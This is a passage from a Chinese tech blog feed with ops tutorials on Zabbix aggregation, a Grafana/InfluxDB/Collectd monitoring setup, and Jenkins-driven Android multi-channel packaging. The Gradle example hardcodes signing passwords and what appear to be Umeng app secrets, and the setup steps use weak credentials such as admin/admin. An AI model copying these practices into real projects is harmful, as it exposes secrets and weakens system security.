</code></pre><p><strong>3.创建模板和项目</strong><br>A. 创建模板Online_Count_Template<br>B. 创建项目send.count.data<br><img src="http://www.simlinux.com/wp-content/uploads/2016/10/t1.png" alt=""></p>
<p>C. 创建Total监控项,其他略<br><img src="http://www.simlinux.com/wp-content/uploads/2016/10/t2.png" alt=""></p>
<p><strong>4. 创建图形</strong><br><img src="http://www.simlinux.com/wp-content/uploads/2016/10/t3.png" alt=""></p>
<p><strong>5. 将模板关联到主机即可(可通过最新数据查看是否有数据上报 )</strong></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[利用Zabbix做流量聚合汇总]]></title>
      <url>/2016/08/02/e5-88-a9-e7-94-a8zabbix-e5-81-9a-e6-b5-81-e9-87-8f-e8-81-9a-e5-90-88-e6-b1-87-e6-80-bb.html</url>
      <content type="html"><![CDATA[<blockquote>
<ul>
<li>创建主机群组 : 数据大盘</li>
<li>创建主机 : Geekwolf</li>
<li>创建监控项：网卡流入流出，grpsum实现聚合</li>
<li>创建图形：关联监控项</li>
</ul>
</blockquote>
<p><strong>1. 创建主机群组</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/08/dashboard.png" alt="此处输入图片的描述"></p>
<p><strong>2. 创建主机Geekwolf</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/08/host1.png" alt="此处输入图片的描述"></p>
<p><strong>3. 创建监控项：网卡流入流出，grpsum实现聚合</strong></p>
<p>点击创建主机界面上方的项目</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/08/host2.png" alt="此处输入图片的描述"><br> <img src="http://www.simlinux.com/wp-content/uploads/2016/08/host3.png" alt="此处输入图片的描述"></p>
<p><strong>4. 创建图形：关联监控项</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/08/host4.png" alt="此处输入图片的描述"></p>
<p><strong>5. 最终效果</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/08/traffic.png" alt="此处输入图片的描述"></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Grafana+InfluxDB+Collectd构建监控系统]]></title>
      <url>/2016/04/28/grafanainfluxdbcollectd-e6-9e-84-e5-bb-ba-e7-9b-91-e6-8e-a7-e7-b3-bb-e7-bb-9f.html</url>
      <content type="html"><![CDATA[<h3 id="架构原理"><a href="#架构原理" class="headerlink" title="架构原理"></a>架构原理</h3><p>Collectd(数据采集,配置Server连接InfluxDB的25826端口) -&gt; InfluxDB(数据存储,启用collectd插件监听25826端口) —&gt; Grafana(数据展示)</p>
<blockquote>
<ul>
<li>Collectd ： C 语言开发的一个守护(daemon)进程，周期性收集统计数据和存储，拥有丰富的插件包括监控Ceph,DRBD,OpenLDAP,ZK等，类似statD(graphite也可以用来采集数据，不过展示功能没有Grafana丰富)，数据可以存储在Kafka,InfluxDB，OpenTSDB等上*   InfluxDB:   GO开发的开源分布式时序数据库，适合存储指标，时间，分析等数据</li>
<li>Grafana： 是一个开源的，具有丰富指标仪表盘的数据展示和图表编辑工具，支持Graphite,Elasticsearch,OpenTSDB,Prometheus和influxDB,Zabbix等</li>
</ul>
</blockquote>
<h3 id="Collectd"><a href="#Collectd" class="headerlink" title="Collectd"></a>Collectd</h3><ol>
<li><p>安装collectd</p>
<p>yum -y  install perl-ExtUtils-Embed perl-ExtUtils-MakeMaker  liboping*<br>wget <a href="https://collectd.org/files/collectd-5.5.0.tar.gz" target="_blank" rel="external">https://collectd.org/files/collectd-5.5.0.tar.gz</a><br>tar xf collectd-5.5.0.tar.gz<br>cd collectd-5.5.0<br>./configure –enable-cpu  –enable-df –enable-disk –enable-interface –enable-load –enable-memory –enable-ping –enable-swap –enable-users –enable-uptime<br>make &amp;&amp; make install<br>cp contrib/redhat/init.d-collectd  /etc/rc.d/init.d/collectd<br>chmod +x /etc/rc.d/init.d/collectd<br>ln -s /opt/collectd/sbin/collectdmon  /usr/sbin/<br>ln -s /opt/collectd/sbin/collectd  /usr/sbin/<br>`</p>
</li>
<li><p>配置collectd</p>
<pre>`vim /etc/collectd.conf
BaseDir "/opt/collectd"
PIDFile "/run/collectd.pid"
Hostname "host.example.com"
Interval 60
&lt;loadplugin df&gt;
Interval 120
&lt;/loadplugin&gt;
LoadPlugin disk
LoadPlugin interface
LoadPlugin load
LoadPlugin memory
LoadPlugin network
LoadPlugin processes
LoadPlugin users
&lt;plugin interface&gt;
Interface "eth1"
IgnoreSelected false
&lt;/plugin&gt;
&lt;plugin network&gt;
Server "10.44.38.244" "25826"
&lt;/plugin&gt;
`</pre></li>
<li><p>说明<br>默认collectd进程会每10s中调用注册在配置文件中的插件，默认全局参数interval＝10s(10s上报一次数据到influxdb等)，针对不同的插件可以配置不同的搜集数据的时间间隔interval</p>
<h3 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h3></li>
<li><p>安装并启动服务</p>
<pre>`cat &lt; &lt;EOF | sudo tee /etc/yum.repos.d/influxdb.repo
[influxdb]
name = InfluxDB Repository - RHEL \$releasever
baseurl = https://repos.influxdata.com/rhel/\$releasever/\$basearch/stable
enabled = 1
gpgcheck = 1
gpgkey = https://repos.influxdata.com/influxdb.key
EOF
yum -y install influxdb
service influxdb start
启动后TCP端口:8083 为InfluxDB 管理控制台
  TCP端口:8086 为客户端和InfluxDB通信时的HTTP API
启动后InfluxDB用户认证默认是关闭的，先创建用户:geekwolf geekwolf
命令行输入influx
`</pre></li>
<li>基本使用<pre>`[root@geekwolf ~]# influx
Visit https://enterprise.influxdata.com to register for updates, InfluxDB server management, and monitoring.
Connected to http://localhost:8086 version 0.12.2
InfluxDB shell 0.12.2
&gt; create database collectdb
&gt; create database collectdb
&gt; show databases
name: databases
\------
name
_internal
collectdb
&gt; create user geekwolf with password 'geekwolf'
&gt; show users
user            admin
geekwolf        false
&gt; grant all on collectdb from to geekwolf
&gt; help show
Usage:
    connect &lt;host:port&gt;   connects to another node specified by host:port
    auth                  prompts for username and password
    pretty                toggles pretty print for the json format
    use &lt;db_name&gt;         sets current database
    format &lt;format&gt;       specifies the format of the server responses: json, csv, or column
    precision &lt;/format&gt;&lt;format&gt;    specifies the format of the timestamp: rfc3339, h, m, s, ms, u or ns
    consistency &lt;level&gt;   sets write consistency level: any, one, quorum, or all
    history               displays command history
    settings              outputs the current settings for the shell
    exit/quit/ctrl+d      quits the influx shell
    show databases        show database names
    show series           show series information
    show measurements     show measurement information
    show tag keys         show tag key information
    show field keys       show field key information
    A full list of influxql commands can be found at:
    https://docs.influxdata.com/influxdb/v0.10/query_language/spec
`</pre></li>
<li><p>启用认证</p>
<pre>`修改配置文件启用认证
sed -i ’s#auth-enabled = false#auth-enabled = true#g’ /etc/influxdb/influxdb.conf
service influxdb restart
`</pre>

<h3 id="配置InfluxDB支持Collectd"><a href="#配置InfluxDB支持Collectd" class="headerlink" title="配置InfluxDB支持Collectd"></a>配置InfluxDB支持Collectd</h3></li>
<li><p>修改配置</p>
<pre>`vim /etc/influxdb/influxdb.conf
[collectd]
enabled = true
bind-address = "10.44.38.244:25826"
database = "collectdb"
typesdb = "/opt/collectd/share/collectd/types.db"
batch-size = 5000
batch-pending = 10
batch-timeout = "10s"
read-buffer = 0
service influxdb restart
`</pre></li>
<li><p>查看metrics信息</p>
<pre>`[root@geekwolf ~]# influx
Visit https://enterprise.influxdata.com to register for updates, InfluxDB server management, and monitoring.
Connected to http://localhost:8086 version 0.12.2
InfluxDB shell 0.12.2
&gt; use collectdb
Using database collectdb
&gt; show field keys
name: cpu_value
---------------
fieldKey
value

name: df_free
-------------
fieldKey
value

name: df_used
-------------
fieldKey
value

name: disk_read
---------------
fieldKey
value
&gt; select * from cpu_value limit 15;
name: cpu_value
---------------
time                    host                    instance        type    type_instance   value
1461657293000000000     host.example.com        1               cpu     idle            1.59845e+06
1461657293000000000     host.example.com        1               cpu     system          2316
1461657293000000000     host.example.com        1               cpu     nice            508
1461657293000000000     host.example.com        0               cpu     steal           0
1461657293000000000     host.example.com        1               cpu     user            11619
1461657293000000000     host.example.com        1               cpu     interrupt       0
1461657293000000000     host.example.com        1               cpu     steal           0
1461657293000000000     host.example.com        1               cpu     wait            172
1461657293000000000     host.example.com        1               cpu     softirq         0
1461657303000000000     host.example.com        1               cpu     wait            172
1461657303000000000     host.example.com        1               cpu     softirq         0
1461657303000000000     host.example.com        1               cpu     nice            508
1461657303000000000     host.example.com        0               cpu     idle            1.587007e+06
1461657303000000000     host.example.com        0               cpu     softirq         127
1461657303000000000     host.example.com        0               cpu     interrupt       54
`</pre>

<h3 id="安装配置Grafana"><a href="#安装配置Grafana" class="headerlink" title="安装配置Grafana"></a>安装配置Grafana</h3><pre>`yum install https://grafanarel.s3.amazonaws.com/builds/grafana-3.0.0-beta51460725904.x86_64.rpm
目录结构
/usr/sbin/grafana-server
/etc/init.d/grafana-server          上述命令的拷贝，启动脚本
/etc/sysconfig/grafana-server       环境变量
/etc/grafana/grafana.ini            配置文件
/var/log/grafana/grafana.log        日志文件
/var/lib/grafana/grafana.db     sqlite3数据库

启动服务: service grafana-server start
         chkconfig grafana-server on

`</pre>

<p>访问地址:<a href="http://10.44.38.244:3000" target="_blank" rel="external">http://10.44.38.244:3000</a> 默认账号为admin admin<br>关闭Grafana注册功能:</p>
<p><pre>`sed -i ’s/#allow_sign_up = true/allow_sign_up = false/g’  /etc/grafana/grafana.ini,重启服务</pre></p>
</li>
</ol>
<ul>
<li>添加InfluxDB数据源</li>
</ul>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/04/datasource.png" alt="此处输入图片的描述"></p>
<ul>
<li>添加ping图的例子</li>
</ul>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/04/ping.png" alt="此处输入图片的描述"></p>
<ul>
<li>图表展示</li>
</ul>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/04/view.png" alt="此处输入图片的描述"></p>
<p>详细demo可参考:<a href="http://play.grafana.org/" target="_blank" rel="external">http://play.grafana.org/</a></p>
<h3 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h3><p>问题 :在使用influxdb0.12.x版本和Grafana2.6时出现multiple query syntax的bug,原因是influxdb的apiwent</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/04/multiquery.png" alt="此处输入图片的描述"></p>
<p>解决方法: 升级Grafana2.6到Grafana3.0-beta1以上版本<br> <a href="https://github.com/grafana/grafana/commit/ed62822d442569e7ba287ff63d83a069a596c458" target="_blank" rel="external">https://github.com/grafana/grafana/commit/ed62822d442569e7ba287ff63d83a069a596c458</a></p>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="http://docs.grafana.org" target="_blank" rel="external">http://docs.grafana.org</a></p>
<p><a href="https://collectd.org/wiki/index.php/Table_of_Plugins" target="_blank" rel="external">https://collectd.org/wiki/index.php/Table_of_Plugins</a></p>
<p><a href="https://docs.influxdata.com/influxdb/v0.12/introduction/getting_started/" target="_blank" rel="external">https://docs.influxdata.com/influxdb/v0.12/introduction/getting_started/</a></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Android多渠道打包这样做才酸爽！？]]></title>
      <url>/2016/04/21/android-e5-a4-9a-e6-b8-a0-e9-81-93-e6-89-93-e5-8c-85-e8-bf-99-e6-a0-b7-e5-81-9a-e6-89-8d-e9-85-b8-e7-88-bd-ef-bc-81-ef-bc-9f.html</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>　　多渠道主要目的是为了统计各个应用市场用户数据分析(比如活跃数，崩溃率等)，收集用户信息，这时需要唯一标识来区分这些渠道，本文主要针对多渠道(几百个渠道甚至更多的情况)如何快速打包?</p>
<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><blockquote>
<ul>
<li>Jenkins集成Gradle实现打包自动化</li>
<li>通过Jenkins参数化构建实现自定义环境和渠道打包，签名</li>
<li>测试包自动上传fir并通过钉钉发送通知</li>
<li>正式包按版本归档到OSS，发布时拷贝包到发布目录</li>
<li>自动刷新CDN</li>
</ul>
</blockquote>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><blockquote>
<ul>
<li>系统 : Centos6.5 x64</li>
<li>jdk-7u79-linux-x64</li>
<li>android-sdk_r24.4.1-linux</li>
<li>gradle-2.2.1</li>
<li>Python-2.7.10(操作DingTalk和OSS API)</li>
<li>Jenkins2.0/Tomcat-7.0.65</li>
</ul>
</blockquote>
<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p>1.安装JDK</p>
<pre><code>wget &apos;http://download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.tar.gz?AuthParam=1460974294_526e0f8471004294cb163c9c730ba4f9&apos; -O jdk1.7.0_79.tar.gz
tar xf jdk-7u79-linux-x64.tar.gz -C /usr/local/jdk1.7.0_79
`&lt;/pre&gt;

2.安装Python2.7.10

&lt;pre&gt;`wget https://www.python.org/ftp/python/2.7.10/Python-2.7.10.tgz
tar xf Python-2.7.10.tgz
cd Python-2.7.10
./configure 
make -j4
make install
sed -i &apos;s#python/python2.6#g&apos; /usr/bin/yum
`&lt;/pre&gt;

3.安装Android的SDK

&lt;pre&gt;`wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz
tar xf android-sdk_r24.4.1-linux.tgz -C /usr/local/android-sdk-linux
`&lt;/pre&gt;

4.安装tomcat和jenkins

&lt;pre&gt;`yum -y install tomcat
wget http://mirrors.jenkins-ci.org/war-rc/2.0/jenkins.war -O /usr/share/tomcat/webapps/jenkins.war
`&lt;/pre&gt;

5.配置环境变量，启动服务

&lt;pre&gt;`vim /etc/profile
export ANDROID_HOME=/usr/local/android-sdk-linux
export JAVA_HOME=/usr/local/jdk1.7.0_80
export PATH=$PATH:$JAVA_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
source /etc/profile
service tomcat start
Jenkins访问地址:http://192.168.2.2:8080/jenkins/
`&lt;/pre&gt;

6.安装Android SDK依赖包

&lt;pre&gt;`由于Android SDK工具基于32位在64位系统上需要安装32位必须安装的i386依赖库
yum install -y glibc.i686 glibc-devel.i686 libstdc++.i686 zlib-devel.i686 ncurses-devel.i686 libX11-devel.i686 libXrender.i686 libXrandr.i686
`&lt;/pre&gt;

####安装更新对应版本的SDK

&lt;pre&gt;`由于国内直接解析访问dl.google.com,dl-ssl.google.com域名较慢，可以通过更改hosts方式解决:
dig dl.google.com dl-ssl.google.com
将获得IP写入/etc/hosts,例如:
203.208.43.110 dl.google.com
74.125.23.91 dl-ssl.google.com
查看SDK相关列表
android  list sdk --all
Packages available for installation or update: 150
   1- Android SDK Tools, revision 25.1.1
   2- Android SDK Tools, revision 25.1.3 rc1
   3- Android SDK Platform-tools, revision 23.1
   4- Android SDK Platform-tools, revision 24 rc2
   5- Android SDK Build-tools, revision 24 rc3
   6- Android SDK Build-tools, revision 23.0.3
   7- Android SDK Build-tools, revision 23.0.2
   8- Android SDK Build-tools, revision 23.0.1
   9- Android SDK Build-tools, revision 23 (Obsolete)
  10- Android SDK Build-tools, revision 22.0.1
  11- Android SDK Build-tools, revision 22 (Obsolete)
  12- Android SDK Build-tools, revision 21.1.2
  13- Android SDK Build-tools, revision 21.1.1 (Obsolete)
  14- Android SDK Build-tools, revision 21.1 (Obsolete)
  15- Android SDK Build-tools, revision 21.0.2 (Obsolete)
  16- Android SDK Build-tools, revision 21.0.1 (Obsolete)
  17- Android SDK Build-tools, revision 21 (Obsolete)
  18- Android SDK Build-tools, revision 20
  19- Android SDK Build-tools, revision 19.1
  20- Android SDK Build-tools, revision 19.0.3 (Obsolete)
  21- Android SDK Build-tools, revision 19.0.2 (Obsolete)
  22- Android SDK Build-tools, revision 19.0.1 (Obsolete)
  23- Android SDK Build-tools, revision 19 (Obsolete)
  24- Android SDK Build-tools, revision 18.1.1 (Obsolete)
  ...
选择要安装项目的序号
android  update sdk -u -a -t 5,6,7,31,34,136,137 
`&lt;/pre&gt;

#### 手动编译测试Android项目

&lt;pre&gt;`git clone git@git.maka.mobi:android/Android_demo.git
cd Android_demo
查看当前项目包含的tasks(此时若无gradle会自动下载安装)
./gradlew  tasks
清空build目录
./gradlew clean
编译打包所有环境包
./gradlew assemble
编译打包Debug包
./gradlew assembleDebug
编译打包Release包
./gradlew assembleRelease
`&lt;/pre&gt;

#### 多渠道打包项目改造
</code></pre><ol>
<li>包的签名在build.gradle中配置，打包后自动签名</li>
<li>由于META-INF目录下是存放签名信息的，用来保证apk包的完整性和安全，在生成apk时对文件做校验计算并把结果存放在META-INF目录中，安装apk包时应用管理器会按照同样的算法对包里的文件做校验，如果和META-INF中的内容不一致，则无法安装，通过修改apk包在重新打包基本不可能，以此来保证apk包的安全，因此在打完第一个包时，可以在META-INF目录中添加一个channel_wandoujia空文件,代码匹配这个文件获取渠道名wandoujia，来快速实现多渠道打包的目的</li>
<li><p>代码库根目录channel文件存放渠道名</p>
<pre>`apk包解压后目录结构:
├── AndroidManifest.xml
├── assets
├── classes.dex
├── lib
├── META-INF
│   ├── CERT.RSA
│   ├── CERT.SF
│   ├── channel_huawei
│   └── MANIFEST.MF
├── org
├── res
└── resources.arsc
`</pre>

<pre>`Gradle(apk通过gradle签名)例子app/build.gradle:
apply plugin: 'com.android.application'
android {
    compileSdkVersion 22
    buildToolsVersion '23.0.2'
    defaultConfig {
        applicationId "com.maka.app"
        minSdkVersion 16
        targetSdkVersion 22
        versionCode 16
        versionName '2.0.0'

        //dex突破65535的限制
        multiDexEnabled true
    }
    dexOptions {
        jumboMode = true
        incremental true
        javaMaxHeapSize "4g"
        preDexLibraries = false
        incremental true
    }
    signingConfigs {
        debug {
            storeFile file("../key.jks")
            storePassword "helloworld"
            keyAlias "helloworld"
            keyPassword "helloworld"
        }

    }
    packagingOptions {
        exclude 'META-INF/LICENCE.txt'
        exclude 'META-INF/LICENSE.txt'
        exclude 'META-INF/NOTICE.txt'
    }
    lintOptions {
        checkReleaseBuilds false
        // Or, if you prefer, you can continue to check for errors in release builds,
        // but continue the build even when errors are found:
        abortOnError false
    }
    buildTypes {
        debug {
            // 显示Log
            buildConfigField "boolean", "LOG_DEBUG", "true"
            versionNameSuffix "-debug"
            minifyEnabled false
            zipAlignEnabled true
            shrinkResources false
            signingConfig signingConfigs.debug
            manifestPlaceholders = [
                    UMENG_APP_KEY   : "556ac653162s58e06c0000218",
                    UMENG_APP_SECRET: "2a231041d6aa10ec2b2s933003135a7"
            ]
            //Server config
            buildConfigField "boolean", "SELECT_SERVER", "true"
            buildConfigField "String", "TEST_IP", "\"http://test.api.simlinux.com/\""
            buildConfigField "String", "TEST_PROJECT_URL", "\"http://test.viewer.simlinux.com/k/\""
            buildConfigField "String", "TEST_PICTURE_URL", "\"http://test.img1.simlinux.com/\""
            buildConfigField "String", "TEST_RES_URL", "\"http://test.res.simlinux.com/\""
            buildConfigField "String", "FORMAL_IP", "\"http://api.simlinux.com/\""
            buildConfigField "String", "FORMAL_PROJECT_URL", "\"http://viewer.simlinux.com/k/\""
            buildConfigField "String", "FORMAL_PICTURE_URL", "\"http://img1.simlinux.com/\""
            buildConfigField "String", "FORMAL_RES_URL", "\"http://res.simlinux.com/\""

        }
        release {
            // 不显示Log
            buildConfigField "boolean", "LOG_DEBUG", "false"
            minifyEnabled true
            zipAlignEnabled true
            // 移除无用的resource文件
            shrinkResources true
            proguardFile 'proguard-project.txt'
            debuggable false
            shrinkResources false
            signingConfig signingConfigs.debug
            manifestPlaceholders = [
                    UMENG_APP_KEY   : "556ac6s3162358e06c0000218",
                    UMENG_APP_SECRET: "2a231041d6aa10ec2b2s933003135a7"
            ]
            //Server config
            buildConfigField "boolean", "SELECT_SERVER", "false"
            buildConfigField "String", "TEST_IP", "\"\""
            buildConfigField "String", "TEST_PROJECT_URL", "\"\""
            buildConfigField "String", "TEST_PICTURE_URL", "\"\""
            buildConfigField "String", "TEST_RES_URL", "\"\""
            buildConfigField "String", "FORMAL_IP", "\"http://api.simlinux.com/\""
            buildConfigField "String", "FORMAL_PROJECT_URL", "\"http://viewer.simlinux.com/k/\""
            buildConfigField "String", "FORMAL_PICTURE_URL", "\"http://img1.simlinux.com/\""
            buildConfigField "String", "FORMAL_RES_URL", "\"http://res.simlinux.com/\""

        }

    }
    applicationVariants.all { variant -&gt;
        variant.outputs.each { output -&gt;
            def outputFile = output.outputFile
            if (outputFile != null &amp;&amp; outputFile.name.endsWith('.apk')) {
                def fileName = outputFile.name.replace(".apk", "-${defaultConfig.versionName}.apk")
                output.outputFile = new File(outputFile.parent, fileName)
            }
        }
    }
    productFlavors {
    }

}

repositories {
    flatDir {
        dirs 'libs' //this way we can find the .aar file in libs
    }
}
dependencies {
    compile 'com.google.code.gson:gson:2.3.1'
    compile 'com.github.japgolly.android:svg-android:2.0.6'
    compile fileTree(dir: 'libs', include: ['*.jar'])
    compile 'com.android.support:appcompat-v7:22.2.0'
    compile 'com.github.rey5137:material:1.2.1'
    compile 'com.squareup.okhttp:okhttp-apache:2.4.0'
    compile(name: 'vds-sdk-release', ext: 'aar')
    compile 'com.android.support:multidex:1.0.0'
    compile project(':PushSDK')
    compile 'com.google.zxing:core:3.2.1'
    compile 'com.android.support:recyclerview-v7:24.0.0-alpha1'
    compile 'com.rengwuxian.materialedittext:library:2.1.4'
}
`</pre>

<pre>`匹配META-INF/channel_wandoujia文件名读取wandoujia渠道

    public static String readChanel() {
        ApplicationInfo appInfo = ContextManager.getContext().getApplicationInfo();
        String sourceDir = appInfo.sourceDir;
        String ret = "";
        ZipFile zipfile = null;
        Log.i(TAG, "---begin-ret=" + ret);
        try {
            zipfile = new ZipFile(sourceDir);
            Enumeration&lt;?&gt; entries = zipfile.entries();
            while (entries.hasMoreElements()) {
                ZipEntry entry = ((ZipEntry) entries.nextElement());
                String entryName = entry.getName();
                if (entryName.startsWith("META-INF/channel")) {
                    ret = entryName;
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (zipfile != null) {
                try {
                    zipfile.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
`</pre>

<h4 id="Android多渠道打包流程"><a href="#Android多渠道打包流程" class="headerlink" title="Android多渠道打包流程"></a>Android多渠道打包流程</h4><p>基于上述方式实现多渠道打包流程如下:</p>
</li>
</ol>
<ul>
<li>执行gradlew clean清除build目录</li>
<li>执行gradlew assemble编译打包Debug/Release(已自动签名)</li>
<li>上传Debug包到Fir</li>
<li>通过DingTalk发送通知信息到QA讨论组(发送提测apk包版本，下载地址及扫描下载二维码)</li>
<li>提测不通过，修复bug后再次执行前四步</li>
<li>提测通过后，点击Jenkins打包归档多渠道按钮，将执行生成多渠道包并归档包到本地目录/data/2.0.1/xxx.apk</li>
<li>可选择此步上传归档文件到OSS</li>
<li>点击Jenkins发布按钮将最新版本相关渠道归档拷贝至OSS发布目录</li>
<li>刷新CDN生效</li>
<li><p>通过DingTalk发送通知信息到QA讨论组哪些渠道已经发布</p>
<h4 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h4><h5 id="配置Jenkins"><a href="#配置Jenkins" class="headerlink" title="配置Jenkins"></a>配置Jenkins</h5><pre>`插件: Dynamic Choice Parameter
**创建打包测试项目:Android-Test**
`</pre>

<p><img src="http:///www.simlinux.com/wp-content/uploads/2016/04/android-test.png" alt=""><br><img src="http://www.simlinux.com/wp-content/uploads/2016/04/android-test-choice.png" alt=""></p>
<pre>`通过Groovy脚本获取分支
def ver_keys = [ 'bash', '-c', 'cd /usr/share/tomcat/.jenkins/workspace/Android-Test;git branch -a|grep remotes|cut -d "/" -f3|grep -v HEAD|sort' ]
    ver_keys.execute().text.tokenize('\n')
`</pre>

<pre>`构建脚本
#!/bin/bash

PATH=/usr/lib64/qt-3.3/bin:/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/jdk1.7.0_80/bin:/usr/local/android-sdk-linux/tools:/usr/local/android-sdk-linux/platform-tools:/usr/local/gradle-2.2.1/bin:/usr/share/tomcat/bin

cd ${WORKSPACE}
git checkout ${BranchToDeploy}
git pull -f

if [ "${EnvToDeploy}"  = "All Env" ];then

        ${WORKSPACE}/gradlew clean
        ${WORKSPACE}/gradlew assemble

else
        ${WORKSPACE}/gradlew clean
        ${WORKSPACE}/gradlew assemble${EnvToDeploy}

fi
#测试包上传fir，发钉钉通知
/usr/local/bin/python /usr/share/tomcat/AndroidDeploy/androidtest.py
`</pre>

<p><strong>创建多渠道包归档项目:Android-Archive</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/04/android-archive.png" alt=""><br><img src="http://www.simlinux.com/wp-content/uploads/2016/04/android-archive-channel.png" alt=""></p>
<pre>`获取channel列表
def ver_keys = [ 'bash', '-c', 'echo "All Channels"; cat /usr/share/tomcat/.jenkins/workspace/MAKA-Android-Testing/channels' ]
ver_keys.execute().text.tokenize('\n')
构建脚本，更改渠道文件，上传OSS，发送钉钉通知
python /usr/share/tomcat/AndroidDeploy/androidarchive.py
`</pre>

<p><strong>创建发布多渠道包项目:Android-Deploy</strong></p>
<pre>`构建脚本，通过OSS API拷贝要发布的归档渠道包到发布目录，发送钉钉通知
python /usr/share/tomcat/AndroidDeploy/androiddeploy.py
`</pre>

<h4 id="相关脚本"><a href="#相关脚本" class="headerlink" title="相关脚本"></a>相关脚本</h4><p><pre>`├── androidarchive.py       多渠道打包归档脚本<br>├── androiddeploy.py        渠道包发布脚本<br>├── androidtest.py          测试打包脚本<br>└── libs</pre></p>
<pre><code>├── chinanetcenter.py   刷新CDN脚本
├── dingtalk.py         钉钉发送消息,图片，分享脚本
├── fir.py              测试包上传fir脚本
├── __init__.py
└── libsoss.py          oss相关操作脚本(上传，拷贝等)
</code></pre><p>具体代码可根据<a href="https://github.com/geekwolf/AppDeployment按照实际业务进行修改" target="_blank" rel="external">https://github.com/geekwolf/AppDeployment按照实际业务进行修改</a></p>
</li>
</ul>
<h4 id="IOS打包流程"><a href="#IOS打包流程" class="headerlink" title="IOS打包流程"></a>IOS打包流程</h4><ul>
<li>xcodebuild clean 清理build目录</li>
<li>xcodebuild archive 选择不同的环境/BundleID/ProvisionProfile/CodeSigningIdentify 编译，签名生成xcarchive文件放到工程根路径下的 build 文件夹里</li>
<li>xcodebuild -exportArchive 打包生成ipa</li>
<li>测试包自动上传Fir,生产包手动更新AppStore</li>
<li>具体可参考脚本 <a href="https://github.com/geekwolf/AppDeployment/blob/master/IOSDeploy.sh" target="_blank" rel="external">https://github.com/geekwolf/AppDeployment/blob/master/IOSDeploy.sh</a></li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>任何自动化的前提必须先规范化,针对Android多渠道打包渠道命名，apk包命名需要先统一，apk包不要多环境混用(生产环境和测试环境要分离,测试包可自定义切换)；到了这里，会发现我TM乱七八糟搞了这一陀哪里酸爽了？另外一个思路是通过修改apk文件的注释,程序在启动时读取apk文件注释获取渠道名(但是Android系统直到API 19，也就是4.4以上的版本才支持data/app/<package>.apk)<br><strong><em>爽在哪里？</em></strong><br> 1. 打包不再需要开发本地执行(避免中断开发,多人协作时优势更为明显)<br> 2. 多渠道打包时间在于第一个包编译生成和签名的时间,之后的无论多少渠道都只是修改包的META-INF/channel_wandoujia空文件名实现<br> 3. 点下Jenkins按钮无需在等待打包过程，打包完成后发送消息到钉钉会话，这下爽了吗？</package></p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><blockquote>
<p>Gradle入门  <a href="http://www.androidchina.net/2155.html" target="_blank" rel="external">http://www.androidchina.net/2155.html</a><br>  Android签名 <a href="http://www.tuicool.com/articles/2eMZJfu" target="_blank" rel="external">http://www.tuicool.com/articles/2eMZJfu</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> CI/CD </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[初创公司应该如何做好持续集成和部署？]]></title>
      <url>/2016/03/16/1638.html</url>
      <content type="html"><![CDATA[<p>　　　 持续集成和部署是每一个互联网团队都必须要面对的问题，特别是初创公司业务和技术团队快速增长，技术积累较弱的情况下，一个高效的，可遵循持续的运维规范尤为重要，最近一段时间一直在梳理项目开发流程以及自动化测试和部署规范，作为一个总结和大家分享，希望有所帮助：<br>高效可持续的运维环境需要合理的规范作为支撑:</p>
<blockquote>
<ul>
<li>应用管理规范</li>
<li>权限管理规范</li>
<li>配置变更规范</li>
<li>发布策略规范</li>
<li>日志运维规范</li>
<li>持续集成部署实战</li>
</ul>
</blockquote>
